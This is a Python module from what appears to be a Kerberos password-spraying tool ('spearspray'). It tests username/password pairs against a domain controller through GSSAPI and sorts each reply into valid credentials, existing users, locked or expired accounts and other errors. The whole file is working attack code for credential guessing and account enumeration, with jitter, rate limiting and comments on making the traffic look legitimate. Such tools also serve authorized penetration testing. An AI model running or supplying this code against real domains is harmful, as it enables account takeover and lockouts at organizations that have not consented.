from __future__ import annotations

import logging
import os
import random
import re
import tempfile
import time
import threading
from pathlib import Path
from threading import Lock
from typing import Dict, Optional

import gssapi # https://github.com/pythongssapi/python-gssapi
from gssapi import raw as gss_raw
from gssapi.exceptions import GSSError

from spearspray.utils.constants import GREEN, RED, YELLOW, BLUE, RESET

class _RateLimiter: 

    def __init__(self, max_rps: float, logger: logging.Logger):
        """Allow at most `max_rps` operations per second (thread-safe)."""
        self.interval = 1.0 / max_rps # Calculate the interval between allowed requests
        self.next_allowed_time = time.perf_counter() # Initialize the next allowed time to the current time
        
        self.lock = threading.Lock()
        self.log = logger

    def acquire(self) -> None: 
        """
        Block until the caller is allowed to proceed.
        
        Flow:
            1. Grab the lock to work with shared state.
            2. Compute how long until the next slot is free.
            3. If we're early, sleep for that duration.
            4. Reserve the next slot and release the lock.
        """
        with self.lock:
            current_time = time.perf_counter()
            wait_time = self.next_allowed_time - current_time

            if wait_time > 0: # Too early, wait
                self.log.debug("[*] RateLimiter sleeping %.3f s", wait_time)
                time.sleep(wait_time)

            # Update the next allowed time, ensuring it is at least the current time plus the interval
            self.next_allowed_time = max(self.next_allowed_time + self.interval, current_time)

class Kerberos:

    # https://developer.blackberry.com/devzone/files/blackberry-dynamics/macos/group__kerberoscodes.html
    # https://docs.progress.com/bundle/loadmaster-feature-description-kerberos-constrained-delegation-ltsf/page/Appendix-Kerberos-krb5-Error-Messages.html

    KRB_ERROR_CODES = {
    -1765328378: ("KDC_ERR_C_PRINCIPAL_UNKNOWN", "principal does not exist"),
    -1765328366: ("KDC_ERR_CLIENT_REVOKED", "account locked or disabled"),
    -1765328361: ("KDC_ERR_KEY_EXPIRED", "password expired"),
    -1765328360: ("KDC_ERR_PREAUTH_FAILED", "pre-authentication failed"),
    -1765328359: ("KDC_ERR_PREAUTH_REQUIRED", "pre-authentication required"),
    -1765328347: ("KRB_AP_ERR_SKEW", "clock skew too great"),
    -1765328228: ("KDC_UNREACH", "could not contact domain KDC"),
    -1765328370: ("KDC_ERR_ETYPE_NOSUPP", "encryption type not supported"),
    }

    _MSG_VALID_CREDENTIAL = f"{GREEN}[+] %s:%s -> Valid credential{RESET}"
    _MSG_USER_NOT_EXIST = f"{RED}[-] %s -> User does not exist{RESET}"
    _MSG_ACCOUNT_LOCKED = f"{RED}[!] %s -> Account locked or disabled{RESET}"
    _MSG_PASSWORD_EXPIRED = f"{YELLOW}[±] %s:%s -> Password expired{RESET}"
    _MSG_BAD_PASSWORD = f"{BLUE}[±] %s -> Valid user, bad password{RESET}"
    _MSG_PREAUTH_REQUIRED = f"{BLUE}[±] %s -> Pre-authentication required{RESET}"
    _MSG_CLOCK_SKEW = f"{YELLOW}[!] %s -> Clock skew too large{RESET}"
    _MSG_KDC_UNREACHABLE = f"{RED}[!] %s -> Could not contact domain KDC{RESET}"
    _MSG_UNKNOWN_ERROR = f"{RED}[?] %s:%s -> Kerberos error %s: %s{RESET}"
    _MSG_ETYPE_NOSUPP = f"{RED}[!] %s -> Encryption type not supported{RESET}"

    def __init__(self, domain: str, *, kdc: str, jitter: float = 0.0, max_rps: float | None = None) -> None:

        # TODO: Maybe add Context Manager for simplifying cleanup after spraying

        self.domain: str = domain.upper()
        self.kdc: str = kdc.upper()
        self.jitter_min, self.jitter_max = jitter

        self.log = logging.getLogger(__name__)

        self._lock = Lock() # Protects the following dictionaries from concurrent access
        self.valid_credentials: Dict[str, str] = {}
        self.expired_credentials: Dict[str, str] = {}
        self.locked_credentials: Dict[str, str] = {} 
        self.valid_usernames: Dict[str, str] = {} 
        self.failed_credentials: Dict[str, str] = {}
        self.other_errors: Dict[str, str] = {}

        self._krb5_conf = self._create_krb5_config()
        self.rate_limiter = _RateLimiter(max_rps, self.log) if max_rps is not None else None

    def _create_krb5_config(self) -> Path:
        """Generates a temporary Kerberos configuration file (`krb5.conf`) with the specified domain and KDC."""

        # Check if KRB5_CONFIG environment variable is set and points to a valid file (thread-safe check)
        existing_config = os.environ.get("KRB5_CONFIG")
        if existing_config and Path(existing_config).is_file():
            self.log.debug(f"[*] Using existing KRB5_CONFIG: {existing_config}")
            return Path(existing_config)

        content = (
            "[libdefaults]\n"
            f" default_realm = {self.domain}\n"
            " canonicalize = true\n"
            " dns_lookup_kdc = false\n"            # enable if you want to generate legitimate DNS traffic (make spraying a bit more slower).
            " dns_lookup_realm = false\n"          # enable if you want to generate legitimate DNS traffic (make spraying a bit more slower).
            " udp_preference_limit = 1465\n"
            " allow_weak_crypto = false\n"         # avoids DES -> https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html#libdefaults
            " forwardable = false\n"
            " default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac\n"
            " default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac\n"
            " permitted_enctypes  = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96 rc4-hmac\n"
            "\n"
            "[realms]\n"
            f"{self.domain} = {{\n"
            f" kdc = {self.kdc}\n"
            f" admin_server = {self.kdc}\n"
            " }}\n"
            "\n"
            "[domain_realm]\n"
            f" .{self.domain.lower()} = {self.domain}\n"
            f" {self.domain.lower()} = {self.domain}\n"
        )

        file_descriptor, config_path = tempfile.mkstemp(prefix="krb5_", suffix=".conf")
        path = Path(config_path)

        with os.fdopen(file_descriptor, "w", encoding="utf-8") as fh:
            fh.write(content)

        os.environ["KRB5_CONFIG"] = str(path)
        self.log.debug(f"[+] KRB5_CONFIG -> {path}", )
        return path

    def authenticate(self, username: str, password: str) -> bool:

        if self.rate_limiter:
            self.rate_limiter.acquire()

        self._sleep_jitter()

        principal = f"{username}@{self.domain}"

        try:
            gss_raw.acquire_cred_with_password(
                gssapi.Name(principal, gssapi.NameType.user),
                password.encode(),
                lifetime=36_000,    # 10 hours
                usage="initiate",
            )
        except GSSError as exc:
            self._classify_error(username, password, exc)
            return False
        except Exception as exc:
            self._register_failure(username, password, "unexpected_error", str(exc))
            return False

        self._register_valid(username, password)
        return True

    def _sleep_jitter(self) -> None:
        if self.jitter_max == 0.0 and self.jitter_min == 0.0:
            return
        
        delay = random.uniform(self.jitter_min, self.jitter_max)
        self.log.debug("[+] Jitter: sleeping %.2f s", delay)
        time.sleep(delay)

    def _classify_error(self, username: str, password: str, exc: gss_raw.GSSError) -> None:
        
        krb_code = exc.min_code
        if krb_code & 0x80000000:          # MIT/Heimdal -> convert to negative
            krb_code -= 1 << 32

        error_code, error_description = self.KRB_ERROR_CODES.get(
            krb_code,
            (krb_code, self._extract_exc_msg(exc)),
        )

        self.log.debug(f"[-] Auth failed for {username} -> {error_code} (min_code={krb_code}, maj_code={exc.maj_code})")
        self._register_failure(username, password, error_code, error_description)

    @staticmethod
    def _extract_exc_msg(exc: GSSError) -> str:
        """Extracts a human-readable error message from a GSSError."""
        try:
            raw = exc.gen_message()
            full_message = " ; ".join(raw) if isinstance(raw, (list, tuple)) else raw
            
            # Try to extract just the Minor error message which contains the actual Kerberos error
            if "Minor" in full_message:
                # Look for pattern: "Minor (number): actual error message"
                minor_match = re.search(r'Minor \(\d+\): (.+)', full_message)
                if minor_match:
                    return minor_match.group(1).strip()
            
            return full_message
        except Exception:
            return self.log.exception(f"{RED}[-]{RESET} Error extracting message from GSSError.")

    def _update_credentials_and_log(self, dict_to_update: Dict[str, str], log_function, log_message_template: str, username: str, password: Optional[str] = None, error_code: Optional[str] = None, error_description: Optional[str] = None) -> None:
        """Thread-safely updates a credentials dictionary and logs the authentication result."""
        with self._lock:

            # HACK: If the log function is an error or critical logger, we store the error code instead of the password.
            if log_function == self.log.error or log_function == self.log.critical:
                dict_to_update[username] = error_code
            else:
                dict_to_update[username] = password 
            
            # Determine how many arguments the log message template expects
            placeholder_count = log_message_template.count("%s")
            
            try:
                if placeholder_count == 4: # Unknown error template: username, password, error_code, error_description
                    log_function(log_message_template, username, password, error_code, error_description)
                elif placeholder_count == 3: # Default template: username, password, error_description
                    log_function(log_message_template, username, password, error_description or error_code)
                elif placeholder_count == 2: # Username and password
                    log_function(log_message_template, username, password)
                elif placeholder_count == 1: # Username only
                    log_function(log_message_template, username)
                elif placeholder_count == 0: # Static message
                    log_function(log_message_template)
                else:
                    # Fallback for unexpected placeholder counts
                    self.log.warning(f"Invalid log message template with {placeholder_count} placeholders: {log_message_template}")
                    log_function("Authentication result for %s", username)
            except Exception:
                self.log.exception(f"[!] Failed to log authentication result for user '{username}'.")

    def _register_valid(self, username: str, password: str) -> None:
        """Registers a valid credential and logs the success message."""
        self._update_credentials_and_log(self.valid_credentials, self.log.success, self._MSG_VALID_CREDENTIAL, username, password,)

    def _register_failure(self, username: str, password: str, error_code: str, error_description: str) -> None:
        """Prints the appropriate message based on Kerberos error code name and updates the corresponding dictionary."""

        template_map = { # Error code, message template, log level, dictionary to update
            "KDC_ERR_C_PRINCIPAL_UNKNOWN": (self._MSG_USER_NOT_EXIST,  "error", "other_errors"),
            "KDC_ERR_KEY_EXPIRED"       : (self._MSG_PASSWORD_EXPIRED, "warning", "expired_credentials"),
            "KDC_ERR_CLIENT_REVOKED"    : (self._MSG_ACCOUNT_LOCKED,   "critical", "locked_credentials"),
            "KDC_ERR_PREAUTH_FAILED"    : (self._MSG_BAD_PASSWORD,     "debug", "valid_usernames"),
            "KDC_ERR_PREAUTH_REQUIRED"  : (self._MSG_PREAUTH_REQUIRED, "error", "failed_credentials"),
            "KRB_AP_ERR_SKEW"           : (self._MSG_CLOCK_SKEW,       "error", "other_errors"),
            "KDC_UNREACH"               : (self._MSG_KDC_UNREACHABLE,  "error", "other_errors"),
            "KDC_ERR_ETYPE_NOSUPP"      : (self._MSG_ETYPE_NOSUPP,     "error", "other_errors"),
            "unexpected_error"          : (self._MSG_UNKNOWN_ERROR,    "error", "other_errors"),
        }

        default_template = self._MSG_UNKNOWN_ERROR
        message_template, level_name, dict_to_update = template_map.get(error_code, (default_template, "error", "other_errors"))

        dict_to_update = getattr(self, dict_to_update, self.other_errors) # Fallback to other_errors if not found
        log_level = getattr(self.log, level_name, self.log.error) # Get the logging method based on the level name (e.g., logger.warning, logger.critical, etc.)

        self._update_credentials_and_log(dict_to_update, log_level, message_template, username, password, error_code, error_description)

    def cleanup(self) -> None:
        """Removes the temporary `krb5.conf` file if it exists and cleans up the environment variable."""
        if self._krb5_conf and self._krb5_conf.exists():
            try:
                self._krb5_conf.unlink()
                self.log.debug(f"[+] Removed temporary krb5.conf: {self._krb5_conf}")
            except OSError:
                self.log.exception(f"{RED}[-]{RESET} Could not remove temporary krb5.conf {self._krb5_conf}.",)
